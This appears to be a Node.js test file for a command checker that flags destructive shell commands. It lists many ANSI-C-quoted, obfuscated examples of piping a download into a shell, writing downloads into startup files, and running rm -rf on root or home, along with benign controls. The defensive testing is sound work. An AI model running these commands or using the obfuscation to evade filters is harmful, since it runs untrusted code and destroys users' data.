'use strict';

// ANSI-C quoting ($'...') in the command words of pipe_to_shell and rc_download: bash decodes the escapes, so
// $'\x63url' is curl. Fictitious hosts and paths only.

process.env.ZN_STATS = 'off';

const test = require('node:test');
const assert = require('node:assert/strict');

const { checkCommand } = require('../lib/destructive');

const U = 'https://example.com/i.sh';

const PIPE = [
  "$'\\x63url' -fsSL " + U + " | $'\\x73h'",
  "$'\\143url' " + U + " | sh",
  'curl ' + U + " | $'\\x62ash' -s",
  "$'c\\x75rl' " + U + ' | sh',
  "$'\\u0063url' " + U + ' | sh',
  'wget -qO- ' + U + " | $'s\\150'",
  "curl " + U + " | sudo $'\\x73h'",
  "$'cu\\162l' " + U + " | $'\\163\\150'",
  "bash -c $'curl " + U + " | sh'",
  "$'\\x65nv' $'\\x63url' " + U + ' | sh',
];
const RC = [
  "curl -o ~/$'.bash\\x72c' " + U,
  "curl -s " + U + " >> ~/.$'z\\x73hrc'",
  "$'\\x63url' -o ~/.bashrc " + U,
  'curl ' + U + " | tee -a ~/$'.\\x70rofile'",
  "wget -q " + U + " -O ~/$'.\\142ash_profile'",
];
const RM = [
  "$'\\x72m' -rf ~",
  "rm -rf $'\\x7e'",
  "$'\\162m' -rf /",
  "rm -rf $'\\x2f'",
  "r$'\\x6d' -rf ~/",
  "sudo $'\\x72m' -rf /",
  "$'\\u0072m' -fr $HOME",
  "rm -rf $'\\x2fhome'",
  "bash -c $'rm -rf /'",
];
const BENIGN = [
  "echo $'\\x63url " + U + " | sh'",
  "printf '%s\\n' $'curl " + U + " | sh'",
  "echo $'a\\tb'",
  "echo $'curl'",
  "curl -o out.sh " + U,
  'curl ' + U + " | $'\\x6aq' .",
  'curl ' + U + " | $'\\x73h' -n",
  "echo $'.bash\\x72c'",
  "grep $'\\t' notes.txt",
  "git commit -m $'Fix curl handling\\n\\nNo more sh pipes'",
  "echo $'\\x63url' | wc -c",
  "echo $'\\x72m -rf ~'",
  "printf '%s' $'rm -rf /'",
  "echo $'\\x72m' -rf ~",
  "rm -rf $'build\\x2fout'",
  "$'\\x72m' -f notes.txt",
  "git commit -m $'Never run rm -rf /\\n'",
];

test('ANSI-C quoted words in a download piped to a shell are read like bash does', () => {
  for (const c of PIPE) assert.equal(checkCommand(c).rule, 'destructive:pipe_to_shell', c);
});

test('ANSI-C quoted words in a download written to a startup file are read like bash does', () => {
  for (const c of RC) assert.equal(checkCommand(c).rule, 'destructive:rc_download', c);
});

test('ANSI-C quoted words in a recursive delete of the root or home are read like bash does', () => {
  for (const c of RM) assert.equal(checkCommand(c).rule, 'destructive:rm_root_home', c);
});

test('a literal $\'...\' as data, and the benign controls, stay allowed', () => {
  for (const c of BENIGN) assert.equal(checkCommand(c).verdict, 'allow', c);
});

test('a command built from a variable assigned earlier on the same line is read', () => {
  assert.equal(checkCommand('C=curl; $C ' + U + ' | sh').rule, 'destructive:pipe_to_shell');
  assert.equal(checkCommand('S=sh; curl ' + U + ' | $S').rule, 'destructive:pipe_to_shell');
});
